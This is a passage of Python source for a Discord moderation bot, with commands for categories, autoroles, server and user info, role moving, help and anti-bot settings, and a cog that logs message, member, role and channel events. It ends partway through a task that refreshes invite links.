@bot.hybrid_command(name="createcategory", aliases=["makecategory", "newcategory"], description="Create a channel category")
@app_commands.describe(name="Category name")
async def createcategory_cmd(ctx: commands.Context, name: str):
    ok, err = _can_manage_channels_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    name = (name or "").strip()[:100]
    if not name:
        return await ctx.send(embed=discord.Embed(description="❌ Provide a category name.", color=COLORS["error"]))
    try:
        cat = await ctx.guild.create_category(name, reason=f"createcategory by {ctx.author}")
        await ctx.send(embed=discord.Embed(
            description=f"✅ Category **{cat.name}** created.",
            color=COLORS["success"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


# ── Server info + Whois ──────────────────────────────────────────────────
class ServerRolesView(discord.ui.View):
    def __init__(self, guild: discord.Guild):
        super().__init__(timeout=120)
        self.guild = guild

    @discord.ui.button(label="View Roles", style=discord.ButtonStyle.primary)
    async def view_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        roles = [r for r in sorted(self.guild.roles, key=lambda r: r.position, reverse=True) if not r.is_default()]
        if not roles:
            return await interaction.response.send_message("No roles.", ephemeral=True)
        lines = []
        for r in roles[:60]:
            lines.append(f"{r.mention} — `{r.id}` · pos {r.position}" + (" · managed" if r.managed else ""))
        body = "\n".join(lines)
        if len(roles) > 60:
            body += f"\n… and {len(roles)-60} more"
        e = discord.Embed(
            title=f"Roles — {self.guild.name} ({len(roles)})",
            description=body[:4000],
            color=COLORS["main"],
        )
        await interaction.response.send_message(embed=e, ephemeral=True)



def _save_autoroles():
    try:
        save("autoroles", {str(gid): list(roles) for gid, roles in _AUTOROLES.items()})
    except Exception as ex:
        print(f"[autoroles] save: {ex}")


@bot.hybrid_command(name="autorole", aliases=["joinrole", "setautorole"], description="Set roles given automatically when someone joins")
@app_commands.describe(action="add | remove | list | clear", role="Role to add or remove from autorole")
async def autorole_cmd(ctx: commands.Context, action: str = "list", role: discord.Role = None):
    """
    Auto-assign role(s) when a member joins.
    ,autorole list
    ,autorole add @Member
    ,autorole remove @Member
    ,autorole clear
    """
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    if not (
        has_owner_access(ctx.author)
        or ctx.author.id == ctx.guild.owner_id
        or ctx.author.guild_permissions.administrator
        or ctx.author.guild_permissions.manage_guild
        or ctx.author.guild_permissions.manage_roles
    ):
        return await ctx.send(embed=discord.Embed(
            description="❌ Need **Manage Roles** / **Manage Server** / **Administrator**.",
            color=COLORS["error"],
        ))
    action = (action or "list").strip().lower()
    roles = _AUTOROLES.setdefault(ctx.guild.id, [])

    if action in ("list", "show", "status"):
        if not roles:
            return await ctx.send(embed=discord.Embed(
                description="📭 No autoroles set.\nAdd one: `,autorole add @Role`",
                color=COLORS["info"],
            ))
        mentions = []
        for rid in roles:
            r = ctx.guild.get_role(rid)
            mentions.append(r.mention if r else f"`{rid}` (deleted)")
        return await ctx.send(embed=discord.Embed(
            title="🎭 Autoroles",
            description="These roles are given when someone joins:\n" + "\n".join(f"• {m}" for m in mentions),
            color=COLORS["main"],
        ))

    if action in ("clear", "reset", "none"):
        _AUTOROLES[ctx.guild.id] = []
        _save_autoroles()
        return await ctx.send(embed=discord.Embed(description="✅ All autoroles cleared.", color=COLORS["success"]))

    if action in ("add", "set", "+"):
        if role is None:
            return await ctx.send(embed=discord.Embed(description="❌ Usage: `,autorole add @Role`", color=COLORS["error"]))
        if role.is_default():
            return await ctx.send(embed=discord.Embed(description="❌ Cannot use @everyone.", color=COLORS["error"]))
        if role.managed:
            return await ctx.send(embed=discord.Embed(description="❌ Cannot use managed/bot roles.", color=COLORS["error"]))
        me = ctx.guild.me
        if me and role >= me.top_role:
            return await ctx.send(embed=discord.Embed(
                description="❌ My role must be **above** that role to assign it on join.",
                color=COLORS["error"],
            ))
        if role.id not in roles:
            roles.append(role.id)
            _AUTOROLES[ctx.guild.id] = roles
            _save_autoroles()
        return await ctx.send(embed=discord.Embed(
            description=f"✅ {role.mention} will be given when members join.",
            color=COLORS["success"],
        ))

    if action in ("remove", "delete", "rm", "-"):
        if role is None:
            return await ctx.send(embed=discord.Embed(description="❌ Usage: `,autorole remove @Role`", color=COLORS["error"]))
        if role.id in roles:
            roles.remove(role.id)
            _AUTOROLES[ctx.guild.id] = roles
            _save_autoroles()
            return await ctx.send(embed=discord.Embed(
                description=f"✅ {role.mention} removed from autoroles.",
                color=COLORS["success"],
            ))
        return await ctx.send(embed=discord.Embed(description="❌ That role is not in the autorole list.", color=COLORS["error"]))

    await ctx.send(embed=discord.Embed(
        description="❌ Use `list` · `add @Role` · `remove @Role` · `clear`",
        color=COLORS["error"],
    ))



@bot.hybrid_command(name="serverinfo", aliases=["si", "guildinfo"], description="Show info about this server")
async def serverinfo_cmd(ctx: commands.Context):
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    g = ctx.guild
    owner = g.owner
    try:
        if owner is None and g.owner_id:
            owner = await bot.fetch_user(g.owner_id)
    except Exception:
        owner = None

    text_c = len(g.text_channels)
    voice_c = len(g.voice_channels)
    cats = len(g.categories)
    roles = len([r for r in g.roles if not r.is_default()])
    created = g.created_at
    # relative
    try:
        now = datetime.now(timezone.utc)
        delta = now - created
        days = delta.days
        if days >= 365:
            rel = f"{days // 365} year(s) ago"
        elif days >= 30:
            rel = f"{days // 30} month(s) ago"
        else:
            rel = f"{days} day(s) ago"
        created_str = created.strftime("%A, %B %d, %Y %I:%M %p") + f" ({rel})"
    except Exception:
        created_str = str(created)

    e = discord.Embed(title=g.name, color=COLORS["dark"])
    if g.icon:
        e.set_thumbnail(url=g.icon.url)
    e.add_field(name="Owner", value=str(owner) if owner else f"`{g.owner_id}`", inline=True)
    e.add_field(name="Members", value=str(g.member_count or len(g.members)), inline=True)
    e.add_field(name="Roles", value=str(roles), inline=True)
    e.add_field(name="Category Channels", value=str(cats), inline=True)
    e.add_field(name="Text Channels", value=str(text_c), inline=True)
    e.add_field(name="Voice Channels", value=str(voice_c), inline=True)
    e.add_field(name="ID", value=str(g.id), inline=False)
    e.add_field(name="Server Created", value=created_str, inline=False)
    await ctx.send(embed=e, view=ServerRolesView(g))


def _perm_lists(member: discord.Member):
    perms = member.guild_permissions
    major_flags = [
        ("administrator", "Administrator"),
        ("manage_guild", "Manage Server"),
        ("manage_roles", "Manage Roles"),
        ("manage_channels", "Manage Channels"),
        ("kick_members", "Kick Members"),
        ("ban_members", "Ban Members"),
        ("moderate_members", "Moderate Members"),
        ("manage_messages", "Manage Messages"),
        ("mention_everyone", "Mention Everyone"),
        ("manage_webhooks", "Manage Webhooks"),
        ("manage_nicknames", "Manage Nicknames"),
        ("view_audit_log", "View Audit Log"),
    ]
    minor_flags = [
        ("manage_emojis_and_stickers", "Manage Emojis"),
        ("manage_events", "Manage Events"),
        ("manage_threads", "Manage Threads"),
        ("mute_members", "Mute Members"),
        ("deafen_members", "Deafen Members"),
        ("move_members", "Move Members"),
        ("priority_speaker", "Priority Speaker"),
    ]
    if perms.administrator:
        major = ["All Permissions"]
        minor = ["All Permissions"]
    else:
        major = [label for attr, label in major_flags if getattr(perms, attr, False)]
        minor = [label for attr, label in minor_flags if getattr(perms, attr, False)]
        if not major:
            major = ["None"]
        if not minor:
            minor = ["None"]
    acks = []
    if member.id == member.guild.owner_id:
        acks.append("Server Owner")
    if perms.administrator:
        acks.append("Server Admin")
    if member.bot:
        acks.append("Bot")
    if not acks:
        acks.append("Member")
    return major, minor, acks


@bot.hybrid_command(name="whois", aliases=["userinfo", "ui", "who"], description="Show info about a user")
@app_commands.describe(user="Member to look up")
async def whois_cmd(ctx: commands.Context, user: discord.Member = None):
    user = user or (ctx.author if isinstance(ctx.author, discord.Member) else None)
    if user is None:
        return await ctx.send(embed=discord.Embed(description="❌ Provide a user.", color=COLORS["error"]))
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))

    member = user if isinstance(user, discord.Member) else ctx.guild.get_member(user.id)
    if member is None:
        try:
            member = await ctx.guild.fetch_member(user.id)
        except Exception:
            member = None

    target = member or user
    e = discord.Embed(title=str(target), color=COLORS["dark"])
    e.description = target.mention
    if target.display_avatar:
        e.set_thumbnail(url=target.display_avatar.url)

    # Joined
    if member and member.joined_at:
        joined = member.joined_at
        now = datetime.now(timezone.utc)
        days = (now - joined).days
        if days >= 365:
            rel = f"{days // 365} year(s) ago"
        elif days >= 30:
            rel = f"{days // 30} month(s) ago"
        else:
            rel = f"{days} day(s) ago"
        joined_str = joined.strftime("%A, %B %d, %Y %I:%M %p") + f" ({rel})"
        e.add_field(name="Joined Guild", value=joined_str, inline=False)
    else:
        e.add_field(name="Joined Guild", value="Unknown", inline=False)

    created = target.created_at
    now = datetime.now(timezone.utc)
    days = (now - created).days
    if days >= 365:
        rel = f"{days // 365} year(s) ago"
    elif days >= 30:
        rel = f"{days // 30} month(s) ago"
    else:
        rel = f"{days} day(s) ago"
    created_str = created.strftime("%A, %B %d, %Y %I:%M %p") + f" ({rel})"
    e.add_field(name="Account Created", value=created_str, inline=False)

    if member:
        roles = [r.mention for r in sorted(member.roles, key=lambda r: r.position, reverse=True) if not r.is_default()]
        role_txt = " ".join(roles[:30]) if roles else "None"
        if len(roles) > 30:
            role_txt += f" … (+{len(roles)-30})"
        e.add_field(name=f"Roles [{len(roles)}]", value=role_txt[:1020], inline=False)
        major, minor, acks = _perm_lists(member)
        e.add_field(name="Major Permissions", value=", ".join(major), inline=False)
        e.add_field(name="Minor Permissions", value=", ".join(minor), inline=False)
        e.add_field(name="Acknowledgements", value=", ".join(acks), inline=False)
    e.add_field(name="ID", value=str(target.id), inline=False)
    await ctx.send(embed=e)


@bot.hybrid_command(name="move", description="Move a role in the hierarchy (above/below another role, or up/down)")
@app_commands.describe(
    role="The role to move",
    action="up | down | top | bottom | above | below | or a position number",
    other_role="Target role when using above/below",
    amount="How many positions for up/down (default 1)",
)
async def move_cmd(
    ctx: commands.Context,
    role: discord.Role,
    action: str = "up",
    other_role: discord.Role = None,
    amount: int = None,
):
    """
    Move a role in the hierarchy.
    Examples:
      ,move @Mod up
      ,move @Mod up 3
      ,move @Mod down 2
      ,move @Mod top
      ,move @Mod bottom
      ,move @Mod above @Admin
      ,move @Mod below @Member
      ,move @Mod 5
    Works on normal roles and bot/managed roles when Discord allows.
    """
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    author = ctx.author
    if not (
        has_owner_access(author)
        or author.id == ctx.guild.owner_id
        or author.guild_permissions.administrator
        or author.guild_permissions.manage_roles
    ):
        return await ctx.send(embed=discord.Embed(
            description="❌ Need **Manage Roles** or **Administrator**.",
            color=COLORS["error"],
        ))

    me = ctx.guild.me
    if role.is_default():
        return await ctx.send(embed=discord.Embed(description="❌ Cannot move @everyone.", color=COLORS["error"]))

    # Prefix-friendly: ",move @A below @H" may land other_role as None and action="below @H..."
    # Also handle ",move @A up 3" where amount may be None and action is "up 3"
    raw_action = (action or "up").strip()
    action_l = raw_action.lower()
    # Split leftover words from action for prefix parsing
    parts = action_l.split()
    verb = parts[0] if parts else "up"
    # If user typed ",move @Role below @Other" as one string in action (rare)
    if other_role is None and len(parts) >= 2:
        # try resolve second token as role mention/name/id
        token = parts[1].strip()
        rid = None
        if token.startswith("<@&") and token.endswith(">"):
            try:
                rid = int(token[3:-1])
            except Exception:
                rid = None
        elif token.isdigit():
            rid = int(token)
        if rid:
            other_role = ctx.guild.get_role(rid)
        if other_role is None:
            # name search
            name = " ".join(parts[1:])
            other_role = discord.utils.find(lambda r: r.name.lower() == name.lower(), ctx.guild.roles)
        if other_role is None and len(parts) >= 2 and parts[1].isdigit() and verb in ("up", "down", "+", "-"):
            try:
                amount = int(parts[1])
            except Exception:
                pass

    # Hierarchy checks
    if author.id not in (OWNER_ID, ctx.guild.owner_id):
        if role >= author.top_role:
            return await ctx.send(embed=discord.Embed(
                description="❌ That role is equal to or higher than your highest role.",
                color=COLORS["error"],
            ))
        if other_role and other_role >= author.top_role:
            return await ctx.send(embed=discord.Embed(
                description="❌ Target role is equal to or higher than your highest role.",
                color=COLORS["error"],
            ))
    if me and role >= me.top_role and author.id != OWNER_ID:
        return await ctx.send(embed=discord.Embed(
            description="❌ My highest role must be **above** the role you want to move.",
            color=COLORS["error"],
        ))

    cur = role.position
    max_pos = len(ctx.guild.roles) - 1
    if me and author.id != OWNER_ID:
        max_pos = min(max_pos, me.top_role.position - 1)

    try:
        amt = max(1, int(amount)) if amount is not None else 1
    except Exception:
        amt = 1

    new_pos = None
    if verb in ("up", "higher", "+"):
        new_pos = min(max_pos, cur + amt)
    elif verb in ("down", "lower", "-"):
        new_pos = max(1, cur - amt)
    elif verb in ("top", "highest"):
        new_pos = max_pos
    elif verb in ("bottom", "lowest"):
        new_pos = 1
    elif verb in ("above", "over"):
        if other_role is None:
            return await ctx.send(embed=discord.Embed(
                description="❌ Usage: `,move @Role above @OtherRole`",
                color=COLORS["error"],
            ))
        if other_role.id == role.id:
            return await ctx.send(embed=discord.Embed(description="❌ Choose two different roles.", color=COLORS["error"]))
        # Place directly above other_role (Discord shifts intervening roles).
        # Higher position number = higher in hierarchy.
        # Setting position to other_role.position places us in its slot and pushes it down,
        # which is "above" when we were previously below. If already above, use other+1.
        if role.position < other_role.position:
            new_pos = other_role.position
        else:
            new_pos = min(max_pos, other_role.position + 1)
        new_pos = max(1, min(max_pos, new_pos))
    elif verb in ("below", "under"):
        if other_role is None:
            return await ctx.send(embed=discord.Embed(
                description="❌ Usage: `,move @Role below @OtherRole`",
                color=COLORS["error"],
            ))
        if other_role.id == role.id:
            return await ctx.send(embed=discord.Embed(description="❌ Choose two different roles.", color=COLORS["error"]))
        # Place directly below other_role.
        if role.position > other_role.position:
            new_pos = other_role.position
        else:
            new_pos = max(1, other_role.position - 1)
        new_pos = max(1, min(max_pos, new_pos))
    else:
        # numeric absolute position
        try:
            new_pos = max(1, min(max_pos, int(verb)))
        except Exception:
            return await ctx.send(embed=discord.Embed(
                description=(
                    "❌ **Usage**\n"
                    "`,move @Role up [n]` · `,move @Role down [n]`\n"
                    "`,move @Role top` · `,move @Role bottom`\n"
                    "`,move @Role above @Other` · `,move @Role below @Other`\n"
                    "`,move @Role <position>`"
                ),
                color=COLORS["error"],
            ))

    if new_pos == cur:
        return await ctx.send(embed=discord.Embed(
            description=f"ℹ️ {role.mention} is already at position **{cur}**.",
            color=COLORS["info"],
        ))

    try:
        await role.edit(position=new_pos, reason=f"move by {author}")
        # Re-fetch approximate position after Discord settles
        try:
            await ctx.guild.fetch_roles()
        except Exception:
            pass
        final_pos = role.position
        note = ""
        if role.managed:
            note = "\n⚠️ **Bot/managed** role — Discord may partially restrict moves."
        rel = ""
        if other_role:
            rel = f"\n📍 Relative to {other_role.mention}"
        await ctx.send(embed=discord.Embed(
            title="✅ Role Moved",
            description=(
                f"Moved {role.mention}\n"
                f"**{cur}** → **{final_pos}**{rel}{note}"
            ),
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description=(
                "❌ Discord denied the move.\n"
                "• Put **my role** above this role\n"
                "• Some **bot/integration** roles cannot be moved"
            ),
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))



@bot.command(name="help")
async def help_cmd(ctx, *, question: str = None):
    """Interactive help menu, or ask in plain English: ,help how do I ban someone"""
    try:
        if question and str(question).strip():
            requested_help = str(question).strip().lower()
            category_aliases = {
                "games": "minigames", "game": "minigames", "fun": "fun", "minigames": "minigames",
                "casino": "gambling", "gambling": "gambling", "economy": "gambling", "coins": "gambling",
                "security": "security", "security commands": "security", "anti-nuke": "security", "security center": "security", "security intelligence": "security",
                "all": "allcommands", "all commands": "allcommands", "commands": "allcommands",
                "owner": "owner_only", "owner only": "owner_only", "owner tools": "owner_only", "primary owner": "owner_only",
                "admin": "admin", "server admin": "admin", "staff": "moderation", "mod": "moderation", "mods": "moderation",
                "levels": "leveling", "level": "leveling", "casino": "gambling", "economy": "gambling",
                "ai": "ai", "assistant": "ai", "ai assistant": "ai", "ask": "ai", "mini-games": "minigames",
                "home": "home", "general": "general", "setup": "setup", "logging": "logging",
                "tickets": "tickets", "giveaways": "giveaways", "invites": "invites",
                "leveling": "leveling", "moderation": "moderation", "autorespond": "autorespond",
            }
            if requested_help in category_aliases:
                key = category_aliases[requested_help]
                if key in {"owner_only", "allcommands"} and not has_owner_access(ctx.author):
                    return await ctx.send(embed=discord.Embed(
                        title="🔒 Restricted Help",
                        description="That command category is only available to the bot owner.",
                        color=COLORS.get("error", 0xED4245),
                    ))
                if key not in _help_category_keys(ctx.author.id):
                    return await ctx.send("No commands in that category are available to your account.")
                # Every category opens its own paginated page, with its category name at the top.
                # This keeps large categories readable and gives users Prev/Home/Next navigation.
                return await ctx.send(
                    embed=build_help_category(key, 0, ctx.author.id),
                    view=HelpView(getattr(ctx.author, "id", 0), key=key, page=0),
                )
            try:
                await _ai_respond(ctx.message, str(question).strip())
            except Exception as ai_ex:
                print(f"[help-ai] {ai_ex}")
                name = getattr(ctx.author, "display_name", None) or "friend"
                await ctx.send(f"Hey {name}, something went wrong answering that. Try asking again.")
            return
        # Bare ,help → full interactive command list (categories + buttons)
        return await ctx.send(
            embed=build_help_home(getattr(ctx.author, "id", 0), guild=ctx.guild),
            view=HelpView(getattr(ctx.author, "id", 0), guild=ctx.guild),
        )
    except Exception as ex:
        print(f"[help] {ex}")
        import traceback
        traceback.print_exc()
        try:
            await ctx.send(content=f"Help error: `{ex}`")
        except Exception:
            pass



#  LOGGING COG

async def _get_log_channel(guild: discord.Guild) -> discord.TextChannel | None:
    # One-channel override takes priority over legacy per-feature destinations.
    try:
        _settings = load("server_settings")
        _gs = gdata(_settings, guild.id)
        _central_id = _gs.get("mikasa_all_logs_channel")
        if str(_central_id or "").isdigit():
            ch_id = int(_central_id)
        else:
            ch_id = _LOG_CHANNELS.get(guild.id)
    except Exception:
        ch_id = _LOG_CHANNELS.get(guild.id)
    if not ch_id:
        return None
    ch = guild.get_channel(ch_id)
    if ch and ch.permissions_for(guild.me).send_messages:
        return ch
    return None

async def _send_log(guild: discord.Guild, embed: discord.Embed):
    ch = await _get_log_channel(guild)
    if ch:
        try:
            await ch.send(embed=embed)
        except Exception:
            pass


# ── Unknown bot protection ────────────────────────────────
@bot.hybrid_command(name="antibot", description="Kick unknown bots on join: on/off/status")
async def antibot_cmd(ctx: commands.Context, action: str = "status"):
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    if not (has_owner_access(ctx.author) or ctx.author.guild_permissions.administrator):
        return await ctx.send(embed=discord.Embed(description="❌ Admin only.", color=COLORS["error"]))
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    action = action.lower()
    if action in ("on", "enable", "true"):
        gs["antibot_enabled"] = True
        save("server_settings", settings)
        await ctx.send(embed=discord.Embed(
            title="🔒 Anti-Bot ON",
            description="Unknown bots will be **kicked** when they join.\nUse `,whitelist @user bots` (or bot id / role) to allow bots.",
            color=COLORS["success"],
        ))
    elif action in ("off", "disable", "false"):
        gs["antibot_enabled"] = False
        save("server_settings", settings)
        await ctx.send(embed=discord.Embed(
            title="🔓 Anti-Bot OFF",
            description="Bots can join freely (not recommended).",
            color=COLORS["warn"],
        ))
    else:
        enabled = gs.get("antibot_enabled", True)
        lines = []
        try:
            cog = bot.get_cog("AntiNukeCog")
            if cog is not None:
                for uid, cats in cog._get_wl_map(ctx.guild).items():
                    if "all" in cats or "bots" in cats:
                        lines.append(f"• <@{uid}> (`{uid}`) — {', '.join(cats)}")
        except Exception:
            pass
        for i in (gs.get("allowed_bots") or []):
            lines.append(f"• legacy `{i}`")
        body = chr(10).join(lines) if lines else "*none — use `,whitelist @user bots`*"
        await ctx.send(embed=discord.Embed(
            title="🔒 Anti-Bot Status",
            description=(
                f"**Enabled:** {'Yes' if enabled else 'No'} (default: Yes)" + chr(10) + chr(10)
                + f"**Bots whitelist:**" + chr(10) + body
            ),
            color=COLORS["info"],
        ))


class LoggingCog(commands.Cog):
    def __init__(self, bot): self.bot = bot

    # ── Setup commands ──────────────────────────────────────

    @commands.hybrid_command(name="setlog", aliases=["setlogs"], description="Set the server log channel")
    @app_commands.describe(channel="Channel to send logs to (defaults to current)")
    @commands.has_permissions(manage_guild=True)
    async def setlog(self, ctx, channel: discord.TextChannel = None):
        if not ctx.guild:
            return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
        ch = channel or ctx.channel
        _LOG_CHANNELS[ctx.guild.id] = ch.id
        _ldata = load("log_channels")
        if not isinstance(_ldata, dict):
            _ldata = {}
        _ldata[str(ctx.guild.id)] = ch.id
        save("log_channels", _ldata)
        e = discord.Embed(
            title="📋  Logging Enabled",
            description=f"All server events will now be logged to {ch.mention}.",
            color=COLORS["success"],
        )
        e.set_footer(text="Use ,removelog to disable • ,logstatus to check")
        await ctx.send(embed=e)

    @commands.hybrid_command(name="removelog", aliases=["unsetlog", "clearlog"], description="Disable server logging")
    @commands.has_permissions(manage_guild=True)
    async def removelog(self, ctx):
        _LOG_CHANNELS.pop(ctx.guild.id, None)
        _ldata = load("log_channels")
        _ldata.pop(str(ctx.guild.id), None)
        save("log_channels", _ldata)
        await ctx.send(embed=discord.Embed(
            description="📋 Logging disabled. No events will be logged.",
            color=COLORS["warn"],
        ))

    @commands.hybrid_command(name="logstatus", aliases=["logs", "loggingstatus"], description="Show logging status")
    async def logstatus(self, ctx):
        ch_id = _LOG_CHANNELS.get(ctx.guild.id)
        if not ch_id:
            await ctx.send(embed=discord.Embed(
                description="📋 Logging is **not set up**. Use `,setlog #channel` to enable.",
                color=COLORS["error"],
            ))
            return
        ch = ctx.guild.get_channel(ch_id)
        name = ch.mention if ch else f"*(deleted channel — id {ch_id})*"
        await ctx.send(embed=discord.Embed(
            title="📋  Log Status",
            description=f"Logging is **active** → {name}",
            color=COLORS["success"],
        ))

    # ── Message events ──────────────────────────────────────

    @commands.Cog.listener()
    async def on_message_delete(self, message: discord.Message):
        if not message.guild or message.author.bot:
            return
        e = discord.Embed(
            title="🗑️  Message Deleted",
            color=0xED4245,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Author",  value=f"{message.author.mention} (`{message.author}`)", inline=True)
        e.add_field(name="Channel", value=message.channel.mention, inline=True)
        content = message.content or "*[No text content]*"
        e.add_field(name="Content", value=content[:1020], inline=False)
        if message.attachments:
            e.add_field(name="Attachments", value="\n".join(a.filename for a in message.attachments), inline=False)
        e.set_footer(text=f"User ID: {message.author.id}")
        await _send_log(message.guild, e)

    @commands.Cog.listener()
    async def on_message_edit(self, before: discord.Message, after: discord.Message):
        if not before.guild or before.author.bot:
            return
        if before.content == after.content:
            return
        e = discord.Embed(
            title="✏️  Message Edited",
            color=0xFEE75C,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Author",  value=f"{before.author.mention} (`{before.author}`)", inline=True)
        e.add_field(name="Channel", value=before.channel.mention, inline=True)
        e.add_field(name="Before",  value=(before.content or "*empty*")[:1020], inline=False)
        e.add_field(name="After",   value=(after.content  or "*empty*")[:1020], inline=False)
        e.add_field(name="Jump",    value=f"[Go to message]({after.jump_url})", inline=False)
        e.set_footer(text=f"User ID: {before.author.id}")
        await _send_log(before.guild, e)

    # ── Member events ───────────────────────────────────────

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        e = discord.Embed(
            title="📥  Member Joined",
            color=0x57F287,
            timestamp=discord.utils.utcnow(),
        )
        e.set_thumbnail(url=str(member.display_avatar))
        e.add_field(name="User",         value=f"{member.mention} (`{member}`)", inline=True)
        e.add_field(name="Member Count", value=str(member.guild.member_count),   inline=True)
        age_days = (discord.utils.utcnow() - member.created_at).days
        age_str  = f"{age_days // 365}y {age_days % 365}d" if age_days >= 365 else f"{age_days}d"
        e.add_field(name="Account Age",  value=age_str, inline=True)
        e.set_footer(text=f"User ID: {member.id}")
        await _send_log(member.guild, e)

    @commands.Cog.listener()
    async def on_member_remove(self, member: discord.Member):
        e = discord.Embed(
            title="📤  Member Left",
            color=0xFF6B35,
            timestamp=discord.utils.utcnow(),
        )
        e.set_thumbnail(url=str(member.display_avatar))
        e.add_field(name="User", value=f"`{member}` (`{member.id}`)", inline=True)
        roles = [r.mention for r in member.roles if not r.is_default()]
        e.add_field(name="Roles", value=" ".join(roles) if roles else "*none*", inline=False)
        if member.joined_at:
            days = (discord.utils.utcnow() - member.joined_at).days
            e.add_field(name="Time in Server", value=f"{days}d", inline=True)
        e.set_footer(text=f"User ID: {member.id}")
        await _send_log(member.guild, e)

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
        e = discord.Embed(
            title="🔨  Member Banned",
            color=0xED4245,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="User", value=f"`{user}` (`{user.id}`)", inline=True)
        # Check audit log for who banned
        try:
            await asyncio.sleep(0.5)
            async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.ban):
                if entry.target.id == user.id:
                    e.add_field(name="Banned By", value=f"`{entry.user}`", inline=True)
                    if entry.reason:
                        e.add_field(name="Reason", value=entry.reason, inline=False)
                    break
        except Exception:
            pass
        e.set_footer(text=f"User ID: {user.id}")
        await _send_log(guild, e)

    @commands.Cog.listener()
    async def on_member_unban(self, guild: discord.Guild, user: discord.User):
        e = discord.Embed(
            title="✅  Member Unbanned",
            color=0x57F287,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="User", value=f"`{user}` (`{user.id}`)", inline=True)
        try:
            await asyncio.sleep(0.5)
            async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.unban):
                if entry.target.id == user.id:
                    e.add_field(name="Unbanned By", value=f"`{entry.user}`", inline=True)
                    break
        except Exception:
            pass
        e.set_footer(text=f"User ID: {user.id}")
        await _send_log(guild, e)

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member):
        if not before.guild:
            return
        # Nickname change
        if before.nick != after.nick:
            e = discord.Embed(
                title="📝  Nickname Changed",
                color=0x00B0F4,
                timestamp=discord.utils.utcnow(),
            )
            e.add_field(name="User",     value=f"{after.mention} (`{after}`)",         inline=True)
            e.add_field(name="Before",   value=before.nick or "*none*",                 inline=True)
            e.add_field(name="After",    value=after.nick  or "*none*",                 inline=True)
            e.set_footer(text=f"User ID: {after.id}")
            await _send_log(before.guild, e)
        # Roles added / removed
        added   = [r for r in after.roles  if r not in before.roles]
        removed = [r for r in before.roles if r not in after.roles]
        if added or removed:
            e = discord.Embed(
                title="🏷️  Roles Updated",
                color=0x9C27B0,
                timestamp=discord.utils.utcnow(),
            )
            e.add_field(name="User", value=f"{after.mention} (`{after}`)", inline=False)
            if added:
                e.add_field(name="✅ Added",   value=" ".join(r.mention for r in added),   inline=True)
            if removed:
                e.add_field(name="❌ Removed", value=" ".join(r.mention for r in removed), inline=True)
            e.set_footer(text=f"User ID: {after.id}")
            await _send_log(before.guild, e)

    # ── Role events ─────────────────────────────────────────

    @commands.Cog.listener()
    async def on_guild_role_create(self, role: discord.Role):
        e = discord.Embed(
            title="🎭  Role Created",
            color=role.color.value or 0x5865F2,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Name",  value=role.mention, inline=True)
        e.add_field(name="Color", value=str(role.color), inline=True)
        key_perms = [p for p, v in role.permissions if v and p in (
            "administrator","manage_guild","ban_members","kick_members",
            "manage_channels","manage_roles","mention_everyone",
        )]
        if key_perms:
            e.add_field(name="Key Perms", value=", ".join(key_perms), inline=False)
        e.set_footer(text=f"Role ID: {role.id}")
        await _send_log(role.guild, e)

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role):
        e = discord.Embed(
            title="🗑️  Role Deleted",
            color=0xED4245,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Name",  value=role.name,      inline=True)
        e.add_field(name="Color", value=str(role.color), inline=True)
        e.set_footer(text=f"Role ID: {role.id}")
        await _send_log(role.guild, e)

    # ── Channel events ──────────────────────────────────────

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel: discord.abc.GuildChannel):
        e = discord.Embed(
            title="📢  Channel Created",
            color=0x57F287,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Name",     value=channel.mention,                              inline=True)
        e.add_field(name="Type",     value=str(channel.type).replace("_", " ").title(),  inline=True)
        e.add_field(name="Category", value=channel.category.name if channel.category else "*none*", inline=True)
        e.set_footer(text=f"Channel ID: {channel.id}")
        await _send_log(channel.guild, e)

    @commands.Cog.listener()
    async def on_guild_channel_delete(self, channel: discord.abc.GuildChannel):
        e = discord.Embed(
            title="🗑️  Channel Deleted",
            color=0xED4245,
            timestamp=discord.utils.utcnow(),
        )
        e.add_field(name="Name",     value=f"#{channel.name}",                           inline=True)
        e.add_field(name="Type",     value=str(channel.type).replace("_", " ").title(),  inline=True)
        e.add_field(name="Category", value=channel.category.name if channel.category else "*none*", inline=True)
        e.set_footer(text=f"Channel ID: {channel.id}")
        await _send_log(channel.guild, e)

#  EVENTS

@tasks.loop(hours=24)
async def _refresh_destroy_invite():
    """Regenerate DESTROY_INVITE_LINK and REQUIRED_GUILD_INVITE daily so they never go stale."""
    global DESTROY_INVITE_LINK, REQUIRED_GUILD_INVITE
    try:
        # ── Destroy invite: first guild the owner is in ──
        owner = bot.get_user(OWNER_ID)
        target_guild = None
        if owner:
            for g in bot.guilds:
                if g.get_member(OWNER_ID):
